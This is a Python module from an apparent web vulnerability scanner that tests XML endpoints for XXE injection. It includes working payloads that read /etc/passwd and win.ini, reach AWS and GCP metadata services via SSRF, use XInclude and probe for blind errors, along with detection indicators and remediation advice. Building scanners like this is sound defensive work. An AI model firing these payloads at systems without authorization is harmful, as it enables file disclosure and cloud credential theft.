"""
XML External Entity (XXE) Injection Scanner
OWASP: A05 - Security Misconfiguration | CWE-611

Detects XXE vulnerabilities in applications that process XML input.
Techniques: file retrieval (Linux/Windows), SSRF via XXE (AWS/GCP metadata),
XInclude attacks, and blind XXE (error-based).
"""

import re
import logging
from urllib.parse import urlparse
from app.scanner.vulnerabilities.base import BaseScanner
from app.scanner.payload_manager import get_payload_manager

logger = logging.getLogger(__name__)


class XXEScanner(BaseScanner):
    """Detects XML External Entity (XXE) injection vulnerabilities.

    Tests endpoints that accept XML for:
    1. Classic file retrieval (Linux /etc/passwd, Windows win.ini)
    2. SSRF via XXE (AWS, GCP metadata services)
    3. XInclude attacks
    4. Blind/error-based XXE
    """

    # URL path patterns that commonly accept XML
    XML_URL_PATTERNS = [
        '/api/', '/soap/', '/xml/', '/rest/', '/wsdl/', '/service/',
        '/upload/', '/import/', '/parse/', '/process/', '/feed/',
    ]

    # Parameter names that commonly carry XML
    XML_PARAM_NAMES = [
        'xml', 'data', 'payload', 'document', 'doc', 'input',
        'body', 'content', 'request', 'message', 'soap', 'xmldata',
    ]

    # ── Payload definitions ──────────────────────────────────────────

    def __init__(self, session=None, timeout=8, delay=0.5):
        super().__init__(session, timeout, delay)
        self._pm_xxe_payloads = []
        try:
            self.payload_manager = get_payload_manager()
            pm_payloads = self.payload_manager.get_payloads('xxe', source='both')
            # Store PM payloads as raw strings for structured wrapping in _get_xxe_payloads
            self._pm_xxe_payloads = pm_payloads
            stats = self.payload_manager.get_stats()
            count = stats['total'].get('xxe', 0)
            logger.info(f'XXE: {count} payloads available ({len(pm_payloads)} from PayloadManager)')
        except Exception as e:
            self.payload_manager = None
            logger.debug(f'PayloadManager not available: {e}')

        # AI-generated smart payloads
        self._smart_xxe_payloads = []
        try:
            smart = self._get_smart_payloads('xxe')
            if smart:
                self._smart_xxe_payloads = smart
        except Exception:
            pass

    def _get_xxe_payloads(self):
        """Return structured XXE payload sets for testing."""
        payloads = [
            {
                'name': 'file-retrieval-linux',
                'payload': (
                    '<?xml version="1.0" encoding="UTF-8"?>'
                    '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
                    '<root><data>&xxe;</data></root>'
                ),
                'indicators': ['root:', 'daemon:', 'bin:', '/bin/bash', '/bin/sh', 'nobody:'],
                'severity': 'critical',
                'cvss': 9.1,
                'description': 'Retrieved /etc/passwd via XXE file:// entity.',
            },
            {
                'name': 'file-retrieval-windows',
                'payload': (
                    '<?xml version="1.0" encoding="UTF-8"?>'
                    '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>'
                    '<root><data>&xxe;</data></root>'
                ),
                'indicators': ['[extensions]', '[files]', '[fonts]', '[mci extensions]'],
                'severity': 'critical',
                'cvss': 9.1,
                'description': 'Retrieved c:\\windows\\win.ini via XXE file:// entity.',
            },
            {
                'name': 'ssrf-aws-metadata',
                'payload': (
                    '<?xml version="1.0" encoding="UTF-8"?>'
                    '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM '
                    '"http://169.254.169.254/latest/meta-data/"> ]>'
                    '<root><data>&xxe;</data></root>'
                ),
                'indicators': ['ami-id', 'instance-id', 'instance-type',
                               'AccessKeyId', 'SecretAccessKey', 'local-ipv4'],
                'severity': 'critical',
                'cvss': 9.8,
                'description': 'Accessed AWS EC2 metadata via XXE SSRF.',
            },
            {
                'name': 'ssrf-gcp-metadata',
                'payload': (
                    '<?xml version="1.0" encoding="UTF-8"?>'
                    '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM '
                    '"http://metadata.google.internal/computeMetadata/v1/"> ]>'
                    '<root><data>&xxe;</data></root>'
                ),
                'indicators': ['project', 'instance', 'serviceAccounts', 'zone'],
                'severity': 'critical',
                'cvss': 9.8,
                'description': 'Accessed GCP metadata via XXE SSRF.',
            },
            {
                'name': 'xinclude',
                'payload': (
                    '<root xmlns:xi="http://www.w3.org/2001/XInclude">'
                    '<xi:include parse="text" href="file:///etc/passwd"/>'
                    '</root>'
                ),
                'indicators': ['root:', 'daemon:', 'bin:', '/bin/bash'],
                'severity': 'critical',
                'cvss': 9.1,
                'description': 'File retrieval via XInclude directive.',
            },
            {
                'name': 'blind-error-based',
                'payload': (
                    '<?xml version="1.0" encoding="UTF-8"?>'
                    '<!DOCTYPE foo [ '
                    '<!ENTITY % xxe SYSTEM "file:///nonexistent_xxe_probe_file"> '
                    '%xxe; ]>'
                    '<root><data>test</data></root>'
                ),
                'indicators': ['parse error', 'entity', 'DOCTYPE', 'XML',
                               'SYSTEM', 'not found', 'failed to load',
                               'error loading', 'No such file'],
                'severity': 'high',
                'cvss': 7.5,
                'description': 'Blind XXE confirmed via XML parser error disclosure.',
            },
        ]

        # Append PayloadManager XXE payloads as additional entries
        existing_payloads = {ps['payload'] for ps in payloads}
        for raw_payload in self._pm_xxe_payloads:
            if raw_payload not in existing_payloads:
                payloads.append({
                    'name': 'portswigger-xxe',
                    'payload': raw_payload,
                    'indicators': ['root:', 'daemon:', '/bin/bash', '[fonts]',
                                   '[extensions]', 'ami-id', 'instance-id',
                                   'parse error', 'entity', 'DOCTYPE',
                                   'No such file'],
                    'severity': 'high',
                    'cvss': 7.5,
                    'description': 'XXE payload from PortSwigger Academy.',
                })

        return payloads

    # ── Endpoint detection ───────────────────────────────────────────

    def _is_xml_endpoint(self, point, url):
        """Check if an endpoint or parameter is likely to accept XML.

        Checks:
        - URL path patterns (/api/, /soap/, /xml/, etc.)
        - Parameter name patterns (xml, data, payload, etc.)
        - Form action or method hints
        """
        parsed = urlparse(url)
        path = parsed.path.lower()

        # Check URL path patterns
        if any(pattern in path for pattern in self.XML_URL_PATTERNS):
            return True

        # Check parameter name
        if isinstance(point, dict):
            param_name = point.get('name', '').lower()
            if any(name in param_name for name in self.XML_PARAM_NAMES):
                return True

            # Check form inputs for XML-related names
            if point.get('type') == 'form':
                for inp in point.get('inputs', []):
                    inp_name = inp.get('name', '').lower()
                    if any(name in inp_name for name in self.XML_PARAM_NAMES):
                        return True

        return False

    # ── Core testing ─────────────────────────────────────────────────

    def _test_xxe(self, url, point, payload_set):
        """Test a single XXE payload against an endpoint.

        Sends XML body as POST and checks response for indicators.
        Returns a vulnerability finding dict or None.
        """
        try:
            headers = {
                'Content-Type': 'application/xml',
                'Accept': 'application/xml, text/xml, */*',
            }

            response = self._request(
                'POST', url,
                data=payload_set['payload'],
                headers=headers,
            )

            if not response:
                return None

            body = response.text.lower()
            detected = [ind for ind in payload_set['indicators']
                        if ind.lower() in body]

            if not detected:
                return None

            # Build evidence snippet (first 300 chars around first indicator)
            snippet = ''
            idx = body.find(detected[0].lower())
            if idx >= 0:
                start = max(0, idx - 50)
                end = min(len(response.text), idx + 250)
                snippet = response.text[start:end].strip()

            param_name = ''
            if isinstance(point, dict):
                param_name = point.get('name', 'xml_body')
            else:
                param_name = 'xml_body'

            # Record ML data
            self._record_attempt(
                url=url,
                param=param_name,
                payload=payload_set['payload'][:200],
                baseline_response=None,
                test_response=response,
                vuln_found=True,
                technique=f'xxe-{payload_set["name"]}',
                vuln_type='xxe',
                confidence=90,
                severity=payload_set['severity'],
                method='POST',
                context='xml_body',
            )

            finding = {
                'vuln_type': 'xxe',
                'name': f'XML External Entity (XXE) Injection - {payload_set["name"]}',
                'description': (
                    f'{payload_set["description"]} '
                    'The application processes XML input without disabling '
                    'external entity resolution, allowing attackers to read '
                    'files or access internal services.'
                ),
                'impact': (
                    'XXE can lead to:\n'
                    '• File disclosure (configs, source code, credentials)\n'
                    '• SSRF attacks against internal services\n'
                    '• Denial of Service via entity expansion\n'
                    '• Remote Code Execution (in rare cases)'
                ),
                'severity': payload_set['severity'],
                'cvss_score': payload_set['cvss'],
                'confidence': 90,
                'owasp_category': 'A05',
                'cwe': 'CWE-611',
                'affected_url': url,
                'parameter': param_name,
                'payload': payload_set['payload'],
                'request_data': (
                    f'POST {url}\n'
                    f'Content-Type: application/xml\n\n'
                    f'{payload_set["payload"][:300]}'
                ),
                'response_data': (
                    f'Status: {response.status_code}\n'
                    f'Indicators found: {", ".join(detected)}\n'
                    f'Snippet: {snippet[:200]}'
                ),
                'remediation': (
                    '1. Disable DTDs and external entities in XML parsers:\n'
                    '   • Python: use defusedxml instead of xml.etree or lxml\n'
                    '   • Java: XMLInputFactory.setProperty(IS_SUPPORTING_EXTERNAL_ENTITIES, false)\n'
                    '   • PHP: libxml_disable_entity_loader(true)\n'
                    '   • .NET: XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit\n'
                    '2. Use JSON instead of XML where possible\n'
                    '3. Validate and sanitize XML input against an XSD schema\n'
                    '4. Keep XML parsers and libraries updated'
                ),
            }
            if 'difficulty' in payload_set:
                finding['difficulty'] = payload_set['difficulty']
            return finding

        except Exception as e:
            logger.debug(f'XXE test error: {e}')
            return None

    # ── Main scan ────────────────────────────────────────────────────

    def scan(self, target_url, injectable_points):
        """Scan for XXE vulnerabilities across all injectable points.

        Only tests endpoints that are likely to accept XML input.
        """
        self.findings = []
        seen = set()

        # Test the base URL itself (for APIs that accept XML)
        self._scan_url(target_url, {'name': 'xml_body'}, seen)

        for point in injectable_points:
            if isinstance(point, dict) and point.get('type') == 'form':
                form_url = point.get('action', target_url)
                if self._is_xml_endpoint(point, form_url):
                    self._scan_url(form_url, point, seen)
            elif isinstance(point, dict) and 'name' in point:
                url = point.get('url', target_url)
                if self._is_xml_endpoint(point, url):
                    self._scan_url(url, point, seen)

        return self.findings

    def _scan_url(self, url, point, seen):
        """Test a single URL with all XXE payloads."""
        key = url
        if key in seen:
            return
        seen.add(key)

        for payload_set in self._get_xxe_payloads():
            result = self._test_xxe(url, point, payload_set)
            if result:
                self.findings.append(result)
                break  # One finding per endpoint is enough
